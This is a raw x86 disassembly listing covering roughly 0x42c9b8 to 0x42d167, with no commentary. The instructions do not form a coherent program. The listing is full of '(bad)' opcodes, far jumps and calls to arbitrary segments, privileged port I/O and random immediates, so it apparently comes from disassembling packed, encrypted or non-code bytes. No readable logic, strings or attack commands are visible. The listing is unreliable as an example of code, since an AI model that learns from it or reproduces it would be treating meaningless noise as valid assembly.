  42c9b8:	test   dh,bl
  42c9ba:	pop    ebx
  42c9bb:	scas   eax,DWORD PTR es:[edi]
  42c9bc:	popa   
  42c9bd:	sub    ch,BYTE PTR ss:[esi-0x51e30834]
  42c9c4:	inc    esi
  42c9c5:	adc    BYTE PTR [esi-0x2f],0xd0
  42c9c9:	sbb    BYTE PTR [esi+0x54b8600e],cl
  42c9cf:	push   ss
  42c9d0:	sub    eax,0xa282800c
  42c9d5:	scas   al,BYTE PTR es:[edi]
  42c9d6:	popa   
  42c9d7:	xchg   BYTE PTR [esi+eiz*1+0x5495de40],bl
  42c9de:	xor    eax,0xf21a0835
  42c9e3:	sbb    eax,0x42ae35b8
  42c9e8:	or     eax,0xce3b615d
  42c9ed:	xor    dh,0xa6
  42c9f0:	cli    
  42c9f1:	dec    ebx
  42c9f2:	adc    DWORD PTR [ebx],0xe
  42c9f5:	inc    eax
  42c9f6:	inc    esp
  42c9f7:	ret    0xc856
  42c9fa:	sub    DWORD PTR [edx+0x36c06015],esp
  42ca00:	dec    esp
  42ca01:	pop    es
  42ca02:	and    bh,al
  42ca04:	push   esi
  42ca05:	cmp    BYTE PTR ds:0x636be67b,cl
  42ca0b:	cs mov ah,0x10
  42ca0e:	lods   eax,DWORD PTR ds:[esi]
  42ca0f:	xchg   DWORD PTR ds:0x160687b5,esi
  42ca15:	mov    ch,0xe0
  42ca17:	push   ss
  42ca18:	jmp    0x42ca42
  42ca1a:	stc    
  42ca1b:	add    DWORD PTR ds:0x7c9485,ebx
  42ca21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ca22:	js     0x42c9c2
  42ca24:	pop    edx
  42ca25:	mov    ds:0x37026384,eax
  42ca2a:	mov    esi,0xeea58d3
  42ca2f:	add    ebx,DWORD PTR [edi]
  42ca31:	adc    al,0xa8
  42ca33:	ret    0x6a96
  42ca36:	mov    dh,0x9e
  42ca38:	mov    eax,es
  42ca3a:	pushf  
  42ca3b:	fisttp WORD PTR [esi+0x4e]
  42ca3e:	jle    0x42ca53
  42ca40:	fsub   DWORD PTR [eax+0x1c]
  42ca43:	je     0x42ca2a
  42ca45:	cwde   
  42ca46:	add    al,0x56
  42ca48:	fisttp WORD PTR [edx-0x4d355c53]
  42ca4e:	ret    0x9631
  42ca51:	mov    al,0xd6
  42ca53:	mov    esp,edx
  42ca55:	les    esp,FWORD PTR [ecx-0x20]
  42ca58:	add    BYTE PTR [ebp-0xe],bl
  42ca5b:	retf   
  42ca5c:	cs int3 
  42ca5e:	pop    ebx
  42ca5f:	add    bl,bl
  42ca61:	lock test al,0x8f
  42ca64:	xchg   edx,eax
  42ca65:	in     al,0xd9
  42ca67:	xor    al,0x4
  42ca69:	or     eax,0x40c3d676
  42ca6e:	shr    DWORD PTR [edx],cl
  42ca70:	fidiv  WORD PTR [ebp-0xc]
  42ca73:	call   0xdeed:0x8760098c
  42ca7a:	sbb    bl,ah
  42ca7c:	add    eax,0xa586d547
  42ca81:	cmp    al,BYTE PTR [eax-0x6a710faa]
  42ca87:	mov    ch,BYTE PTR [edi-0x1e]
  42ca8a:	ja     0x42ca9a
  42ca8c:	xor    al,0x45
  42ca8e:	mov    al,BYTE PTR ds:0xe5beb8cd
  42ca94:	nop
  42ca95:	call   0x61c2:0x7d9e34d5
  42ca9c:	mov    es,WORD PTR [ebp-0x44]
  42ca9f:	popa   
  42caa0:	add    eax,0x587464d8
  42caa5:	loopne 0x42ca3d
  42caa7:	lods   al,BYTE PTR ds:[esi]
  42caa8:	call   0x5b33a0c7
  42caad:	jo     0x42cae6
  42caaf:	or     dh,BYTE PTR [eax-0x5c6f671d]
  42cab5:	cmp    al,0xae
  42cab7:	dec    ebx
  42cab8:	pop    eax
  42cab9:	mov    edi,0x14170254
  42cabe:	les    eax,FWORD PTR [edi]
  42cac0:	push   edx
  42cac1:	xchg   DWORD PTR [ebx+0x69],eax
  42cac4:	inc    ebx
  42cac5:	add    esi,DWORD PTR [ebx-0x7d02cd4d]
  42cacb:	mov    dl,0xb9
  42cacd:	or     eax,0x62df8d88
  42cad2:	jmp    0x99fa:0xb4c3b42e
  42cad9:	and    cl,BYTE PTR [eax-0x1d2dbeb2]
  42cadf:	fld    QWORD PTR [esi]
  42cae1:	add    ebx,DWORD PTR ds:[ebx]
  42cae4:	mov    esp,0xd93aa334
  42cae9:	call   0xfd84c52e
  42caee:	jp     0x42ca90
  42caf0:	mov    al,0xce
  42caf2:	and    al,0x94
  42caf4:	push   ebx
  42caf5:	lds    edx,FWORD PTR [ebx-0x49ae090c]
  42cafb:	jl     0x42ca87
  42cafd:	retf   0x6a36
  42cb00:	jbe    0x42cb43
  42cb02:	popa   
  42cb03:	push   ecx
  42cb04:	dec    esp
  42cb05:	in     al,dx
  42cb06:	jb     0x42cb22
  42cb08:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42cb09:	outs   dx,BYTE PTR ds:[esi]
  42cb0a:	retf   0xcf85
  42cb0d:	push   edx
  42cb0e:	aad    0x7b
  42cb10:	or     DWORD PTR [eax-0x16],esp
  42cb13:	inc    esp
  42cb14:	and    BYTE PTR [ebx],0x84
  42cb17:	cwde   
  42cb18:	shl    BYTE PTR [ecx+0x6b3a20aa],0xa
  42cb1f:	sub    ebx,esp
  42cb21:	cmp    al,0x52
  42cb23:	arpl   WORD PTR [ebp+0x16],dx
  42cb26:	mov    al,BYTE PTR [edx]
  42cb28:	adc    eax,DWORD PTR [ebp+0x528a10ef]
  42cb2e:	call   0xc45cade3
  42cb33:	ret    
  42cb34:	aaa    
  42cb35:	push   ds
  42cb36:	loop   0x42cb0e
  42cb38:	cwde   
  42cb39:	sub    DWORD PTR [eax],0x2
  42cb3c:	shr    BYTE PTR [esi],1
  42cb3e:	loopne 0x42cb1e
  42cb40:	add    BYTE PTR [ebp+0x5c],0x66
  42cb44:	push   es
  42cb45:	adc    al,0x5a
  42cb47:	sub    ecx,DWORD PTR [edx+0x340e4678]
  42cb4d:	sbb    ah,bh
  42cb4f:	jns    0x42cb7c
  42cb51:	jmp    0xbe56:0xe0011484
  42cb58:	gs inc esi
  42cb5a:	add    BYTE PTR [ebx-0x5d4f926d],bh
  42cb60:	popf   
  42cb61:	pop    esi
  42cb62:	(bad)  
  42cb66:	into   
  42cb67:	dec    esp
  42cb68:	dec    esp
  42cb69:	jge    0x42cb14
  42cb6b:	dec    ecx
  42cb6c:	inc    esp
  42cb6d:	mov    BYTE PTR [esi],ch
  42cb6f:	or     DWORD PTR [eax],ecx
  42cb71:	mov    esp,0x4a6c60f8
  42cb76:	sbb    ah,BYTE PTR [eax-0x2f566a9]
  42cb7c:	(bad)  
  42cb7d:	lods   eax,DWORD PTR ds:[esi]
  42cb7e:	(bad)  [esi]
  42cb80:	sub    eax,DWORD PTR [edx-0x65]
  42cb83:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42cb84:	pusha  
  42cb85:	push   cs
  42cb86:	(bad)  
  42cb87:	dec    esp
  42cb88:	cmp    bh,cl
  42cb8a:	call   0x500d:0xb5acb016
  42cb91:	pushf  
  42cb92:	sub    BYTE PTR [esi],0xb5
  42cb95:	call   0xa4d0:0xd6b658c2
  42cb9c:	push   0xcdb6614c
  42cba1:	dec    esp
  42cba2:	(bad)  
  42cba3:	loop   0x42cbcb
  42cba5:	fadd   DWORD PTR [eax+0x76d06ae8]
  42cbab:	loopne 0x42cb50
  42cbad:	push   edi
  42cbae:	je     0x42cbf6
  42cbb0:	cmc    
  42cbb1:	sub    BYTE PTR [edx+0x13],ah
  42cbb4:	sbb    al,0x34
  42cbb6:	mov    bh,0xa3
  42cbb8:	int3   
  42cbb9:	push   ecx
  42cbba:	sub    al,ah
  42cbbc:	cwde   
  42cbbd:	fsub   st,st(6)
  42cbbf:	ror    BYTE PTR [esi+0x419e6536],cl
  42cbc5:	mov    ah,0x4d
  42cbc7:	cmp    al,0xa
  42cbc9:	cmp    al,0x4e
  42cbcb:	fsubr  QWORD PTR [esi+0x35b6d55a]
  42cbd1:	mov    ch,0xd6
  42cbd3:	push   ss
  42cbd4:	push   0x204cd9f4
  42cbd9:	lods   al,BYTE PTR ds:[esi]
  42cbda:	int3   
  42cbdb:	jbe    0x42cba5
  42cbdd:	and    al,0x4c
  42cbdf:	jecxz  0x42cbce
  42cbe1:	add    DWORD PTR [eax-0xb160981],eax
  42cbe7:	push   edx
  42cbe8:	or     eax,0x60ec9600
  42cbed:	push   ss
  42cbee:	or     BYTE PTR [esi+0x38],bl
  42cbf1:	mov    cs,WORD PTR [edx]
  42cbf3:	pusha  
  42cbf4:	mov    DWORD PTR ss:[edx],ecx
  42cbf7:	add    esp,DWORD PTR [eax+0x12]
  42cbfa:	push   eax
  42cbfb:	add    ah,bh
  42cbfd:	xor    BYTE PTR [ebx+eiz*4+0x6b4040e1],ch
  42cc04:	dec    edx
  42cc05:	cmp    BYTE PTR [edx+ebx*2],dl
  42cc08:	popa   
  42cc09:	and    eax,0xdcda50ac
  42cc0e:	xchg   ebp,eax
  42cc0f:	repnz fdivr QWORD PTR [ecx+0x43]
  42cc13:	ror    DWORD PTR [esi-0x44],0x11
  42cc17:	pop    eax
  42cc18:	(bad)  
  42cc19:	call   0x9b4c:0xb000c5e0
  42cc20:	pop    eax
  42cc21:	inc    esp
  42cc22:	test   DWORD PTR [esi],ebp
  42cc24:	sbb    eax,0x41ca52d8
  42cc29:	test   eax,0x8007ec1
  42cc2e:	and    al,0x43
  42cc30:	pop    esi
  42cc31:	xchg   BYTE PTR [edi],bl
  42cc33:	push   0x40a1b60d
  42cc38:	dec    edx
  42cc39:	in     al,dx
  42cc3a:	std    
  42cc3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42cc3c:	mov    BYTE PTR [esi-0x5c],ch
  42cc3f:	sub    BYTE PTR [ecx+0x64],dl
  42cc42:	mov    eax,ds:0xdc22a809
  42cc47:	sbb    BYTE PTR [edx],dl
  42cc49:	imul   ebp,DWORD PTR [eax+0x70609852],0xffffffea
  42cc50:	pop    es
  42cc51:	mov    esp,0x7686a03d
  42cc56:	add    al,0x62
  42cc58:	xchg   esp,eax
  42cc59:	shl    BYTE PTR fs:[esi+0x58],cl
  42cc5d:	mov    ebx,DWORD PTR [edx]
  42cc5f:	dec    edi
  42cc60:	push   es
  42cc61:	or     cl,BYTE PTR [eax-0x3b758705]
  42cc67:	jmp    0xcab5:0x8885eba2
  42cc6e:	pop    esi
  42cc6f:	iret   
  42cc70:	aam    0xad
  42cc72:	push   ecx
  42cc73:	add    eax,0x28169a0b
  42cc78:	test   al,0xfc
  42cc7a:	out    0x26,al
  42cc7c:	pop    edx
  42cc7d:	and    al,BYTE PTR [ebx]
  42cc7f:	mov    dl,0x5d
  42cc81:	not    BYTE PTR [edx]
  42cc83:	sbb    ebx,DWORD PTR [ecx+0x765a983a]
  42cc89:	(bad)  
  42cc8a:	push   esi
  42cc8b:	imul   eax,DWORD PTR ds:0xd4a25ea1,0x4c
  42cc92:	sbb    BYTE PTR [ebp+edx*1+0x4d],0x66
  42cc97:	leave  
  42cc98:	mov    al,ds:0x9a7a5e92
  42cc9d:	jo     0x42ccf9
  42cc9f:	xor    DWORD PTR [ebp+0x65601a45],0x2e
  42cca6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42cca7:	or     bl,BYTE PTR [eax+0x5154ac1f]
  42ccad:	push   eax
  42ccae:	mov    al,ds:0x22780c00
  42ccb3:	mov    edx,0xee6dab62
  42ccb8:	pop    eax
  42ccb9:	and    bl,BYTE PTR [eax+0x59]
  42ccbc:	int3   
  42ccbd:	push   esi
  42ccbe:	add    BYTE PTR [ebp+esi*4-0x4c],ch
  42ccc2:	xchg   esp,eax
  42ccc3:	and    eax,0x2385a70e
  42ccc8:	test   BYTE PTR [eax+ebp*4+0x4d859a8],0x9
  42ccd0:	pop    esp
  42ccd1:	pop    edi
  42ccd2:	xchg   ebx,eax
  42ccd3:	sub    al,0xe2
  42ccd5:	adc    ebp,esi
  42ccd7:	xchg   esi,eax
  42ccd8:	enter  0xa0ed,0x21
  42ccdc:	mov    ds,WORD PTR [edx]
  42ccde:	sub    ch,dh
  42cce0:	jp     0x42cca8
  42cce2:	retf   
  42cce3:	ds es push eax
  42cce6:	add    BYTE PTR [ebp+0x5e],cl
  42cce9:	jbe    0x42ccd1
  42cceb:	xchg   esp,eax
  42ccec:	xor    eax,0x40d15427
  42ccf1:	pusha  
  42ccf2:	out    dx,al
  42ccf3:	xchg   edi,eax
  42ccf4:	loopne 0x42cc8a
  42ccf6:	dec    esp
  42ccf7:	scas   al,BYTE PTR es:[edi]
  42ccf8:	mov    al,ds:0x69a6ad05
  42ccfd:	inc    esi
  42ccfe:	xor    al,0x30
  42cd00:	(bad)
  42cd03:	jae    0x42cd71
  42cd05:	cmp    bl,BYTE PTR [esp+edx*1]
  42cd08:	push   es
  42cd09:	ins    BYTE PTR es:[edi],dx
  42cd0a:	cs dec edi
  42cd0c:	addr16 data16 add dh,cl
  42cd10:	sub    eax,0x6abc674c
  42cd15:	test   al,0xea
  42cd17:	pop    ecx
  42cd18:	rol    BYTE PTR [esi],0x5d
  42cd1b:	les    edi,FWORD PTR [edx+edx*8]
  42cd1e:	mov    ds:0x6112248,eax
  42cd23:	push   es
  42cd24:	xchg   edx,eax
  42cd25:	or     al,al
  42cd27:	daa    
  42cd28:	xor    al,0xe0
  42cd2a:	fs mov dh,0xb3
  42cd2d:	rcl    DWORD PTR [ecx],0x2b
  42cd30:	dec    esp
  42cd31:	xchg   ebx,eax
  42cd32:	mov    al,BYTE PTR [edx+edi*2]
  42cd35:	sbb    al,0x61
  42cd37:	xchg   ebp,eax
  42cd38:	xchg   edi,eax
  42cd39:	test   DWORD PTR [esi+0x50ea164f],ebp
  42cd3f:	pop    ss
  42cd40:	inc    esi
  42cd41:	or     BYTE PTR [ebx+edx*8],dh
  42cd44:	or     cl,BYTE PTR [esp+esi*8+0x7d]
  42cd48:	dec    esp
  42cd49:	inc    eax
  42cd4a:	daa    
  42cd4b:	bound  eax,QWORD PTR [ebx+0x72bcd6b5]
  42cd51:	retf   0x3a74
  42cd54:	or     eax,0xd2def894
  42cd59:	or     ah,BYTE PTR [ecx+edx*8]
  42cd5c:	imul   edx,esi,0xffffffa1
  42cd5f:	inc    edx
  42cd60:	mov    esp,0x179a7ca2
  42cd65:	mov    al,ds:0xc7e4acc3
  42cd6a:	fadd   QWORD PTR [edi]
  42cd6c:	repz add BYTE PTR [ebp-0x6a],dl
  42cd70:	int    0xdf
  42cd72:	pusha  
  42cd73:	fsubr  DWORD PTR [edx+0x6c]
  42cd76:	pop    ebx
  42cd77:	ficom  DWORD PTR [esi-0x2]
  42cd7a:	lock add BYTE PTR ds:0x59b00064,ch
  42cd81:	xchg   ebp,eax
  42cd82:	test   BYTE PTR ds:0x92628815,cl
  42cd88:	xlat   BYTE PTR ds:[ebx]
  42cd89:	inc    ebp
  42cd8a:	or     al,BYTE PTR [ebx]
  42cd8c:	test   al,0xd2
  42cd8e:	ret    0x3a30
  42cd91:	daa    
  42cd92:	and    cl,BYTE PTR ds:0x7fc058ed
  42cd98:	jp     0x42cd68
  42cd9a:	mov    ebx,0xb7862d40
  42cd9f:	pop    edx
  42cda0:	push   0xc83f8c3d
  42cda5:	in     al,dx
  42cda6:	pop    ebx
  42cda7:	add    DWORD PTR ds:0x2e9f0a66,edx
  42cdad:	adc    DWORD PTR [edx+edi*8],ebp
  42cdb0:	pop    DWORD PTR [esp+ebp*2-0x4e]
  42cdb4:	add    eax,0xfa26765a
  42cdb9:	mov    cl,dh
  42cdbb:	jo     0x42cd5e
  42cdbd:	(bad)  
  42cdbe:	xlat   BYTE PTR ds:[ebx]
  42cdbf:	aas    
  42cdc0:	pop    edx
  42cdc1:	repnz sbb eax,DWORD PTR [eax]
  42cdc4:	fs bnd ret 
  42cdc7:	xchg   edx,eax
  42cdc8:	call   0xaa82:0xd09409c3
  42cdcf:	or     al,0xc
  42cdd1:	pop    ebp
  42cdd2:	push   eax
  42cdd3:	xchg   ebp,eax
  42cdd4:	fiadd  DWORD PTR [eax]
  42cdd6:	or     eax,0x23628be4
  42cddb:	imul   edx,DWORD PTR [ecx+0x1],0x869e139a
  42cde2:	out    dx,al
  42cde3:	inc    esp
  42cde4:	lock add DWORD PTR [edx-0x3b],0x23
  42cde9:	(bad)  [esi-0x38]
  42cdec:	pusha  
  42cded:	pop    es
  42cdee:	adc    eax,0x561d012a
  42cdf3:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  42cdf5:	hlt    
  42cdf6:	scas   al,BYTE PTR es:[edi]
  42cdf7:	ret    0x51bc
  42cdfa:	test   DWORD PTR [ebx+0x24b41668],ebx
  42ce00:	(bad)  
  42ce01:	mov    bl,0xe6
  42ce03:	add    bl,al
  42ce05:	or     esp,DWORD PTR [ebx-0x2]
  42ce08:	sub    BYTE PTR [edx-0x66],dh
  42ce0b:	push   cs
  42ce0c:	cmp    ch,al
  42ce0e:	sbb    eax,0xdbaeb5ad
  42ce13:	cmp    BYTE PTR [esi],ch
  42ce15:	fs xchg dh,ch
  42ce18:	mov    edx,0x7a8a595e
  42ce1d:	add    bl,BYTE PTR [ebp+0x45]
  42ce20:	idiv   ch
  42ce22:	add    BYTE PTR [ecx-0x3e52348],bh
  42ce28:	enter  0x910,0x1d
  42ce2c:	add    eax,0x7e6c5626
  42ce31:	fmul   DWORD PTR [esi+0x302b4761]
  42ce37:	push   esi
  42ce38:	sub    cl,BYTE PTR [ebp+0xc006558]
  42ce3e:	imul   esi,DWORD PTR ds:0xea2849c,0x824076f9
  42ce48:	add    BYTE PTR [edx-0x6445fd5e],0xe
  42ce4f:	sub    esp,esp
  42ce51:	(bad)  
  42ce52:	push   ds
  42ce53:	push   esi
  42ce54:	mov    WORD PTR [edx+0x54b847a6],fs
  42ce5a:	xchg   edx,eax
  42ce5b:	sahf   
  42ce5c:	call   0x428ab677
  42ce61:	inc    ebp
  42ce62:	repz lock add dl,cl
  42ce66:	shr    ecx,1
  42ce68:	sub    bl,cl
  42ce6a:	test   al,0x92
  42ce6c:	and    eax,0xe841ed0
  42ce71:	imul   BYTE PTR [ecx-0x54]
  42ce74:	xchg   ebp,eax
  42ce75:	shl    BYTE PTR [eax+0x206c135],1
  42ce7b:	test   al,0xaa
  42ce7d:	nop
  42ce7e:	xor    al,0xee
  42ce80:	loop   0x42ceff
  42ce82:	sub    DWORD PTR cs:[edx-0x33cd4596],0x2952e5d
  42ce8d:	fld    TBYTE PTR [edx]
  42ce8f:	mov    al,BYTE PTR [edx]
  42ce91:	jo     0x42cedf
  42ce93:	or     eax,DWORD PTR [eax-0x6a]
  42ce96:	adc    al,0x10
  42ce98:	rcl    BYTE PTR [eax],0xb1
  42ce9b:	jne    0x42ce75
  42ce9d:	mov    cl,0x2c
  42ce9f:	cs pushf 
  42cea1:	xchg   DWORD PTR [edx+0x6a59dde3],ebx
  42cea7:	xchg   edx,eax
  42cea8:	cmp    eax,0x4e23f06
  42cead:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ceae:	jne    0x42ce60
  42ceb0:	or     ch,BYTE PTR [ecx-0x5a87f1e]
  42ceb6:	mov    eax,ds:0x53ac3f22
  42cebb:	adc    eax,0xdc4e1955
  42cec0:	and    bh,dl
  42cec2:	mov    dl,BYTE PTR [eax]
  42cec4:	or     cl,BYTE PTR cs:[edi]
  42cec7:	arpl   WORD PTR [edi+0x17],ax
  42ceca:	and    BYTE PTR [eax],cl
  42cecc:	test   BYTE PTR [esi],al
  42cece:	lds    eax,FWORD PTR [esi-0x1cd4f4d]
  42ced4:	hlt    
  42ced5:	sahf   
  42ced6:	outs   dx,DWORD PTR ds:[esi]
  42ced7:	jne    0x42cf0d
  42ced9:	adc    al,0x18
  42cedb:	nop
  42cedc:	fdiv   st,st(7)
  42cede:	mov    esp,0x8103de9a
  42cee3:	mov    ch,0x35
  42cee5:	push   esp
  42cee6:	fdiv   QWORD PTR ss:[ecx+ebx*4+0x7c]
  42ceeb:	test   BYTE PTR [esi+ebp*8+0x5a],ch
  42ceef:	or     eax,0xe2b7da24
  42cef4:	xchg   edi,eax
  42cef5:	inc    esi
  42cef6:	in     al,0x4a
  42cef8:	or     DWORD PTR [esi+0x3d],esp
  42cefb:	push   0xffffffdc
  42cefd:	xchg   edx,eax
  42cefe:	nop
  42ceff:	push   eax
  42cf00:	mov    dh,BYTE PTR [eax+0x26b61dae]
  42cf06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42cf07:	pop    esp
  42cf08:	ins    BYTE PTR es:[edi],dx
  42cf09:	in     al,dx
  42cf0a:	push   0x69ec62f
  42cf0f:	add    BYTE PTR [edi-0x168dd9a2],ah
  42cf15:	jae    0x42cf2c
  42cf17:	mov    DWORD PTR [ebp-0x6b87318a],ecx
  42cf1d:	out    0x5c,eax
  42cf1f:	add    ah,dl
  42cf21:	dec    ebp
  42cf22:	and    al,0x15
  42cf24:	mov    al,ds:0xe8a0f964
  42cf29:	push   esi
  42cf2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42cf2b:	sub    dh,BYTE PTR fs:[eax+0x1a]
  42cf2f:	mov    al,0xbf
  42cf31:	push   ss
  42cf32:	retf   0xda78
  42cf35:	inc    ebp
  42cf36:	dec    ebp
  42cf37:	xchg   ecx,eax
  42cf38:	inc    ebx
  42cf39:	shl    dl,cl
  42cf3b:	ret    
  42cf3c:	push   0xffffffec
  42cf3e:	les    ebx,FWORD PTR [eax]
  42cf40:	mov    ecx,DWORD PTR [esi-0x36b93a5f]
  42cf46:	jp     0x42cf51
  42cf48:	xor    eax,0x5c143606
  42cf4d:	fdivr  DWORD PTR ds:0x15d48d36
  42cf53:	and    eax,0x8745a8bf
  42cf58:	inc    eax
  42cf59:	mov    esi,0x942efab0
  42cf5e:	pop    ecx
  42cf5f:	loope  0x42cf1b
  42cf61:	ss sbb al,0x2
  42cf64:	adc    cl,ch
  42cf66:	or     BYTE PTR [ebp-0x6eb8c733],bl
  42cf6c:	adc    DWORD PTR [edi],0x5a2e8410
  42cf72:	xchg   edx,eax
  42cf73:	cmp    ecx,DWORD PTR [edx-0x6f553bfc]
  42cf79:	fidivr DWORD PTR [ebp-0x64]
  42cf7c:	xor    eax,0xcaab4eed
  42cf81:	jbe    0x42cf3c
  42cf83:	pop    ss
  42cf84:	test   eax,0x32db901c
  42cf89:	inc    edx
  42cf8a:	rcl    DWORD PTR [ecx-0x7a33427c],0x2a
  42cf91:	xchg   esp,eax
  42cf92:	inc    edx
  42cf93:	rcr    BYTE PTR [ebx+0x9dc9ad9],0xeb
  42cf9a:	add    BYTE PTR [ecx-0x7d7c7aaf],ch
  42cfa0:	xchg   ax,ax
  42cfa2:	adc    BYTE PTR [ebp+0x6e],ah
  42cfa5:	stos   DWORD PTR es:[edi],eax
  42cfa6:	ret    
  42cfa7:	jle    0x42d012
  42cfa9:	jmp    0x3634:0x10352ce8
  42cfb0:	jle    0x42cfb3
  42cfb2:	mov    ds:0x4d4ad6d,al
  42cfb7:	inc    esi
  42cfb8:	aam    0x4
  42cfba:	test   BYTE PTR [ebp+0x7c],bh
  42cfbd:	cmp    al,0xb6
  42cfbf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42cfc0:	mov    dh,0xf0
  42cfc2:	les    ecx,FWORD PTR [esp+ebp*2]
  42cfc5:	dec    esp
  42cfc6:	add    esi,DWORD PTR [esi+0x78]
  42cfc9:	adc    DWORD PTR ds:0x7c06878e,0xffffffa9
  42cfd0:	sbb    al,0x9c
  42cfd2:	xor    al,0x7c
  42cfd4:	xor    DWORD PTR [ebp+0x38600545],0xe84cf756
  42cfde:	or     cl,BYTE PTR [eax+0x5b00d0e4]
  42cfe4:	push   ecx
  42cfe5:	sbb    eax,0x49c41514
  42cfea:	jne    0x42d057
  42cfec:	das    
  42cfed:	or     DWORD PTR [edx+0x5b],eax
  42cff0:	rol    dl,1
  42cff2:	jno    0x42d054
  42cff4:	inc    ebx
  42cff5:	fnstcw WORD PTR [esi-0x52e678fe]
  42cffb:	jecxz  0x42cfe7
  42cffd:	pushf  
  42cffe:	push   es
  42cfff:	sbb    bh,BYTE PTR [esi-0x53abe72f]
  42d005:	add    BYTE PTR [edi+eax*2+0x67],0x60
  42d00a:	je     0x42d026
  42d00c:	or     al,dl
  42d00e:	pop    ecx
  42d00f:	(bad)  
  42d010:	dec    esi
  42d011:	leave  
  42d012:	mov    dl,0x1e
  42d014:	test   al,0xa8
  42d016:	fisubr WORD PTR [ecx-0x5f93ab84]
  42d01c:	mov    al,ds:0x3718b064
  42d021:	and    al,0x47
  42d023:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d024:	pop    es
  42d025:	loope  0x42cfdc
  42d027:	mov    eax,0x4cbae6c6
  42d02c:	or     al,al
  42d02e:	or     al,bh
  42d030:	mov    ds,ebx
  42d032:	cld    
  42d033:	and    edi,DWORD PTR [edx+0x18778e66]
  42d039:	mov    cl,0x4
  42d03b:	rol    DWORD PTR [ecx],0xf2
  42d03e:	mov    al,ds:0x343a0410
  42d043:	sar    BYTE PTR [edi-0x1e],0xde
  42d047:	mov    dl,0x5a
  42d049:	ins    DWORD PTR es:[edi],dx
  42d04a:	imul   edx,edi,0x4a
  42d04d:	jecxz  0x42d02b
  42d04f:	xchg   esi,eax
  42d050:	xor    al,0x89
  42d052:	icebp  
  42d053:	mov    dl,0x33
  42d055:	adc    eax,0x763fd297
  42d05a:	pusha  
  42d05b:	rol    BYTE PTR [eax],1
  42d05d:	cmp    DWORD PTR [esi+ecx*8],eax
  42d060:	and    al,0x1c
  42d062:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d063:	sub    al,0x6a
  42d065:	add    eax,0x48cce60d
  42d06a:	or     al,0x52
  42d06c:	(bad)  
  42d06d:	clc    
  42d06e:	es push ebx
  42d070:	shl    BYTE PTR [esi+0x2f],1
  42d073:	dec    ecx
  42d074:	push   ss
  42d075:	es ss das 
  42d078:	scas   al,BYTE PTR es:[edi]
  42d079:	xchg   ebx,eax
  42d07a:	dec    esp
  42d07b:	in     al,dx
  42d07c:	sub    eax,0x822638a8
  42d081:	inc    esi
  42d082:	lods   al,BYTE PTR ds:[esi]
  42d083:	sti    
  42d084:	rol    BYTE PTR [ebx+eiz*2],0x3d
  42d088:	pop    eax
  42d089:	clc    
  42d08a:	or     dh,dl
  42d08c:	pop    eax
  42d08d:	push   cs
  42d08e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d08f:	and    ecx,DWORD PTR [ebx-0x3c]
  42d092:	xchg   ecx,eax
  42d093:	push   esi
  42d094:	mov    ah,0x3d
  42d096:	push   0xffffff8c
  42d098:	repnz push 0x20816883
  42d09e:	mov    dh,0x61
  42d0a1:	add    ah,dh
  42d0a3:	adc    ah,BYTE PTR [eax-0x7883ffe1]
  42d0a9:	sbb    dh,al
  42d0ab:	adc    ebx,DWORD PTR [edi]
  42d0ad:	add    BYTE PTR [edx],ch
  42d0af:	mov    bl,0xc8
  42d0b1:	sbb    eax,0x6ab71aa
  42d0b6:	pusha  
  42d0b7:	adc    dh,ch
  42d0b9:	add    eax,DWORD PTR [edx+0x5436003a]
  42d0bf:	ret    
  42d0c0:	or     dh,BYTE PTR ds:0x4974a0e8
  42d0c6:	mov    dh,0x86
  42d0c8:	mov    edi,0x64cf6c00
  42d0cd:	ret    
  42d0ce:	xchg   esp,eax
  42d0cf:	sub    eax,0x4134140c
  42d0d4:	mov    ds:0xbe407ec9,al
  42d0d9:	daa    
  42d0da:	dec    esp
  42d0db:	jo     0x42d0ff
  42d0dd:	jecxz  0x42d0ac
  42d0df:	mov    al,0xa3
  42d0e1:	mov    al,ds:0x9906933a
  42d0e6:	inc    edx
  42d0e7:	sbb    bl,BYTE PTR [edi-0x5f58d780]
  42d0ed:	add    ebp,DWORD PTR [edi-0x4c]
  42d0f0:	and    BYTE PTR [ebx+esi*1-0xc],ah
  42d0f4:	sub    BYTE PTR [edx-0x4c],ch
  42d0f7:	mov    al,ds:0xf484aaa8
  42d0fc:	push   es
  42d0fd:	mov    esp,0xbac01fbc
  42d102:	stos   DWORD PTR es:[edi],eax
  42d103:	push   esi
  42d104:	mov    edi,DWORD PTR fs:[esi-0x6b0d4726]
  42d10b:	call   esi
  42d10d:	cwde   
  42d10e:	pop    esp
  42d10f:	add    BYTE PTR [ecx+0x6f],0xa
  42d113:	mov    dh,0x55
  42d115:	dec    esp
  42d116:	jmp    0xc9e291fb
  42d11b:	add    bl,ch
  42d11d:	push   cs
  42d11e:	mov    ds:0xa81ec2aa,al
  42d123:	aam    0xa4
  42d125:	push   0xffffffdc
  42d127:	rcr    DWORD PTR [edx-0x58],0xb0
  42d12b:	push   ebp
  42d12c:	mov    ds:0x1d83c4b6,al
  42d131:	out    dx,al
  42d132:	test   DWORD PTR [edx+0x66],esp
  42d135:	cmp    eax,0x2b059a3d
  42d13a:	int3   
  42d13b:	push   0x50
  42d13d:	ror    BYTE PTR [edx+0x3a],1
  42d140:	jbe    0x42d151
  42d142:	adc    cl,BYTE PTR [eax-0x19ff5553]
  42d148:	add    BYTE PTR [edx+eax*2-0xc],bl
  42d14c:	fstp   DWORD PTR [edx-0x69]
  42d14f:	sbb    al,0x7d
  42d151:	or     eax,0xca15b005
  42d156:	iret   
  42d157:	ret    0x882e
  42d15a:	mov    dh,0x32
  42d15c:	mov    cl,0x3
  42d15e:	loopne 0x42d167
  42d160:	mov    BYTE PTR [ecx+0x70],ch
  42d163:	mov    ebx,DWORD PTR [edx+eax*1-0x54]
  42d167:	push   0xffffffb6
